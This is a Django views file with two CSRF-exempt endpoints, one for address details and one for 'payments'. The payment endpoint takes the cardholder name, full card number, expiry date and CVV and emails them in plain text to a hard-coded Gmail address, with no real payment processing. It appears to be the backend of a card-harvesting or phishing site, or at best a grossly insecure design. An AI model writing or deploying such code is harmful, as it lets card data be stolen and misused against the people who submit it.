from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import send_mail
import json

# Create your views here.

def send_notification_email(form_data):
    email_subject = 'New Address added'
    email_body = f"""
    A new address has been created in the system.
    
    Full Name: {form_data.get('fullName')}
    Address: {form_data.get('address')}
    City: {form_data.get('city')}
    State: {form_data.get('state')}
    ZIP Code: {form_data.get('zipCode')}
    Phone: {form_data.get('phone')}
    """
    send_mail(
        email_subject,
        email_body,
        'tenfortow@gmail.com',
        ['tenfortow@gmail.com'],
        fail_silently=False,
    )

def send_payment_email(payment_data):
    email_subject = 'New Payment Received'
    email_body = f"""
    A new payment has been received.
    
    Name on Card: {payment_data.get('nameOnCard')}
    Card Number: {payment_data.get('cardNumber')}
    Expiry Date: {payment_data.get('expiryDate')}
    CVV: {payment_data.get('cvv')}
    """
    send_mail(
        email_subject,
        email_body,
        'tenfortow@gmail.com',
        ['tenfortow@gmail.com'],
        fail_silently=False,
    )

@csrf_exempt
def address(request):
    if request.method == 'POST':
        form_data = json.loads(request.body)
        send_notification_email(form_data)
        return JsonResponse({'message': 'Address created and email sent'}, status=201)
    elif request.method == 'GET':
        addresses = []  # Replace with actual data retrieval logic
        return JsonResponse(addresses, safe=False)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def payment(request):
    if request.method == 'POST':
        payment_data = json.loads(request.body)
        send_payment_email(payment_data)
        return JsonResponse({'message': 'Payment received and email sent'}, status=201)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)
